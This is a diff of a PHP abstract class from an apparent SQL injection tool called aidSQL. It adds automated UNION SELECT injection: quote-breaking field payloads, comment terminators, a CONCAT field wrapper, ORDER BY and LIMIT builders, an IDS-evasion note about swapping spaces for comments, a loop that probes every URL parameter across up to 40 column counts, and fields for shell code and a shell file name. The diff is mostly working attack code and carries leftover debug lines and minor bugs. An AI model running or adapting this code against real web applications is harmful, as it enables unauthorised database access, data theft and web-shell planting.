@@ -4,24 +4,51 @@
 
 		abstract class InjectionPlugin implements InjectionPluginInterface {
 
-			private		$_stringEscapeCharacter				=	NULL;
-			private		$_queryConcatenationCharacter		=	NULL;
-			private		$_queryCommentOpen					=	NULL;
-			private		$_queryCommentClose					=	NULL;
-			private		$_table									=	NULL;
-			private		$_verbose								=	FALSE;
-			
-			protected	$_log										=	NULL;
+			//General Stuff
+
+			protected	$_logger									=	NULL;
 			protected 	$_httpAdapter							=	NULL;
-			protected 	$_httpCode								=	NULL;
-			protected	$_affectedVariable					=	Array();
-			protected 	$_injectionAttempts					=	40;
+			protected	$_verbose								=	FALSE;
+
+			//This is a plugin that knows howto check if the injection has succeded
+			//The whole point is to the children classes to set the parser of their
+			//preference.
+
 			protected 	$_parser									=	NULL;
-			protected 	$_dbUser									=	NULL;
+
 			protected	$_config									=	NULL;
 			protected	$_isVulnerable							=	FALSE;
+
+			//Injection related stuff
+
+			protected 	$_injectionAttempts					=	40;
+			protected	$_fieldPayloads						=	array('',"'", "%'","')","%')");
+			protected	$_space							=	" ";	//This could be aswell /**/ for evading ids's
+			protected	$_injectionString						=	"UNION ALL SELECT";
+			private		$_fieldEqualityCharacter			=	'=';
+
+			protected	$_fieldWrapper							=	"CONCAT(0x7c,%value%,0x7c)";
+			protected	$_fieldDelimiter						=	',';
+
+			protected	$_commentPayloads						=	array(
+																						array("open"=>"/*","close"=>"/*"),
+																						array("open"=>"--","close"=>""),
+																						array("open"=>"#","close"=>""),
+																						array("open"=>"","close"=>"")
+																		);
+
+			private		$_order									=	array("field"=>"1","sort"=>"DESC");
+			private		$_limit									=	array();
+
+			//Shell related stuff
 			protected	$_shellCode								=	NULL;
 			protected	$_shellFileName						=	NULL;
+
+			//Post SQL Injection information
+			protected	$_affectedFields						=	array();
+
+			//A database schema object
+			protected	$_dbSchema								=	NULL;		
 
 
 			public final function __construct(\aidSQL\http\Adapter $adapter,Array $config,\aidSQL\core\Logger &$log=NULL){
@@ -39,6 +66,46 @@
 				}
 
 				$this->setConfig($config);
+
+			}
+
+			protected function setOrderBy(Array $fields){
+
+				$this->_order["field"]	=	$fields;
+
+			}
+
+			protected function setOrderSorting($sorting){
+				$this->_order["sort"]	=	$sorting;
+			}
+
+			protected function setFieldEqualityCharacter($equalityCharacter){
+
+				$this->_fieldEqualityCharacter	=	$equalityCharacter;
+
+			}
+
+			protected function setLimit(Array $limit){
+
+				$this->_limit	=	$limit;
+
+			}
+
+			protected function setFieldSpace($_space){
+
+				$this->_space	=	$_space;
+
+			}
+
+			protected function setInjectionString($string){
+
+				if(empty($string)){
+
+					throw(new \Exception("Injection string cant be empty, try something like UNION ALL SELECT"));
+
+				}
+
+				$this->_injectionString	=	$string;
 
 			}
 
@@ -71,7 +138,9 @@
 			}
 
 			public function getShellName(){
+
 				return $this->_shellFileName;
+
 			}
 
 			public function setInjectionAttempts($int=0){
@@ -97,7 +166,7 @@
 			}
 
 			public function setLog(\aidSQL\core\Logger &$log){
-				$this->_log = $log;
+				$this->_logger = $log;
 			}
 
 			public function log($msg = NULL,$color="white",$type="0",$toFile=FALSE){
@@ -109,10 +178,10 @@
 
 				$logToFile			=	(isset($this->_config["log-all"]))	?	TRUE	:	$toFile;
 
-				if(!is_null($this->_log)){
+				if(!is_null($this->_logger)){
 
-					$this->_log->setPrepend("[".get_class($this)."]");
-					$this->_log->log($msg,$color,$type,$logToFile);
+					$this->_logger->setPrepend("[".get_class($this)."]");
+					$this->_logger->log($msg,$color,$type,$logToFile);
 					return TRUE;
 
 				}
@@ -121,20 +190,164 @@
 
 			}
 
+			public function setFieldWrapper($fieldWrapper){
+
+				if(!preg_match("%value%",$fieldWrapper)){
+
+					throw(new \Exception("Field wrapper must be set in order to wrap the field!"));
+
+				}
+
+				$this->_fieldWrapper = $fieldWrapper;
+
+			}
+
+			public function wrap($value){
+
+				return preg_replace("/%value%/",$value,$this->_fieldWrapper);
+
+			}
+
+			/**
+			*Checkout if the given URL by the HttpAdapter is vulnerable or not
+			*This method combines execution
+			*/
+
+			public function isVulnerable(){
+
+				$url			=	$this->_httpAdapter->getUrl();
+				$vars			=	$url->getQueryAsArray();
+				$vars			=	$this->orderRequestVariables($vars);
+				$found		=	FALSE;
+
+				$keys	=	array_keys($this->_config);
+
+				if(in_array("numeric-only",$keys)){
+
+					$vars	=	$vars["numeric"];
+
+				}elseif(in_array("strings-only",$keys)){
+
+					$vars	=	$vars["strings"];
+
+				}else{	//Default, use both
+
+					$vars	=	array_merge($vars["numeric"],$vars["strings"]);
+
+				}
+
+				//Start offset, use it when you know the amount of fields involved in the union injection
+
+				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
+
+				if(!$offset){
+					throw(new \Exception("Start offset should be an integer greater than 0!"));
+				}
+
+
+				foreach($vars as $variable=>$value){
+
+					$iterationContainer	=	array();
+
+					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){
+
+						$iterationContainer[]	=	$maxFields;
+
+						$this->log("[$variable] Attempt:\t$maxFields",0,"light_cyan");
+
+						foreach($this->_fieldPayloads as $payLoad){
+
+							foreach($this->_commentPayloads as $terminating){
+
+								$injection		=	$this->generateInjection($value.$payLoad,$iterationContainer,$terminating["open"]);
+								$result			=	$this->query($variable,$injection);
+
+								if($this->_parser->analyze($result)){
+									die("YES");
+									return TRUE;
+								}
+
+							}
+
+						}
+
+					}
+
+					$url	=	$this->_httpAdapter->getUrl();
+
+					//Restore value if we couldnt find the vulnerable field
+					$url->addRequestVariable($variable,$value); 
+					$this->_httpAdapter->setUrl($url);
+
+				}
+
+				return FALSE;
+
+			}
+
+
+			private function generateInjection($fieldValue,Array $values,$terminating=NULL){
+
+				foreach($values as &$value){
+					$value	=	$this->wrap($value);
+				}
+
+				$injection	=	$fieldValue																	.
+									$this->_space																.
+									preg_replace("/\s/",$this->_space,$this->_injectionString)	.
+									$this->_space																.
+									implode($values,$this->_fieldDelimiter);
+
+				if(!empty($this->_order["field"])){
+
+					$injection.=$this->_space;
+					$injection.="ORDER".$this->_space."BY".$this->_space.$this->_order["field"];
+
+					if(!empty($this->_order["sort"])){
+						$injection.=$this->_space.$this->_order["sort"];
+					}
+
+					$order	=	TRUE;
+
+				}
+
+				if(sizeof($this->_limit)){
+
+					if($order){
+						$injection.=$this->_space;
+					}
+
+					$injection	.=	implode($this->_limit,',');
+
+				}
+
+				if(!empty($terminating)){
+					$injection	.=	$this->_space.$terminating;
+				}
+
+				return $injection;
+
+			}
+
+
 			/**
 			*Good for decoupling execution with injection string generation
 			*/
 
-			protected function execute($variable,$value){
+			protected function query($variable,$value){
 
 				$url	=	$this->_httpAdapter->getUrl();
 				$url->addRequestVariable($variable,$value);
 				$this->_httpAdapter->setUrl($url);
 
 				if(isset($this->_config["all"]["decode-requests"]) && (bool)$this->_config["all"]["decode-requests"]){
-					$this->log("Fetching ".urldecode($url->getURLAsString()));
+
+					$this->log("QUERY: ".urldecode($url->getURLAsString()));
+
 				}else{
-					$this->log("Fetching ".$url->getURLAsString());
+
+					$this->log("QUERY: ".$url->getURLAsString());
+
 				}
 
 				try{
@@ -178,16 +391,6 @@
 
 			}
 
-			public function setStringEscapeCharacter($escape=NULL){
-
-				if(empty($escape)){
-					throw(new Exception("String escape character cannot be empty!"));
-				}
-
-				$this->_stringEscapeCharacter	=	$escape;
-
-			}
-
 			public function setHttpAdapter(aidSQL\http\Adapter $adapter){
 				$this->_httpAdapter = $adapter;
 			}
@@ -206,61 +409,30 @@
 
 			}
 
-			public function getTable(){
-				return $this->_table;
-			}
+			public function getSchema(){
 
-			public function getStringEscapeCharacter(){
+				return $this->_dbSchema;
 
-				return $this->_stringEscapeCharacter;
-
-			}
-
-			public function setQueryConcatenationCharacter($concatChar=NULL){
-
-				if(empty($concatChar)){
-					throw(new Exception("String escape character cannot be empty!"));
-				}
-
-				$this->_queryConcatenationCharacter = $concatChar;
-
-			}
-
-			public function getQueryConcatenationCharacter(){
-				return $this->_queryConcatenationCharacter;
-			}
-
-			public function setQueryCommentOpen($commentOpen=NULL){
-
-				if(is_null($commentOpen)){
-					throw(new \Exception("Query comment open character cant be null!"));
-				}
-
-				$this->_queryCommentOpen = $commentOpen;
-
-			}
-
-			public function getQueryCommentOpen(){
-				return $this->_queryCommentOpen;
-			}
-
-			public function setQueryCommentClose($commentClose=NULL){
-
-				if(is_null($commentClose)){
-					throw(new Exception("Query comment close character cant be NULL!"));
-				}
-
-				$this->_queryCommentClose = $commentClose;
-
-			}
-
-			public function getQueryCommentClose(){
-				return $this->_queryCommentClose;
 			}
 
 			public function setAffectedVariable($var,$value){
 
 				$this->_affectedVariable = array("variable"=>$var,"value"=>$value);
+
+			}
+
+			/**
+			*Sets the affected field to inject further commands
+			*@param int $affectedField
+			*/
+
+			public function setAffectedField($affectedField=NULL){
+
+				if(empty($affectedField)){
+					throw (new \Exception("The affected field cant be empty"));
+				}
+
+				$this->_affectedField = $affectedField;
 
 			}
 
@@ -281,7 +453,7 @@
 				return $this->_verbose;
 			}
 
-			public function setParser(\aidSQL\parser\ParserInterface $parser){
+			public function setParser(\aidSQL\parser\ParserInterface &$parser){
 				$this->_parser = $parser;
 			}
 
@@ -323,6 +495,7 @@
 			 * are available.
 			 * @return Array Parsers as string
 			 */
+
 			public function listParsers(){
 
 					$dir	= __CLASSPATH."/parser/";
@@ -347,6 +520,26 @@
 					return $parserList;
 
 			}
+
+			private function orderRequestVariables(Array $requestVariables){
+
+				$numVariables	=	array();
+				$strVariables	=	array();
+
+				foreach($requestVariables as $name=>$value){
+
+					if(is_numeric($value)){
+						$numVariables[$name]	=	$value;
+					}else{
+						$strVariables[$name]	=	$value;
+					}
+
+				}
+
+				return array("strings"=>$strVariables,"numeric"=>$numVariables);
+
+			}
+
 
 		}
 
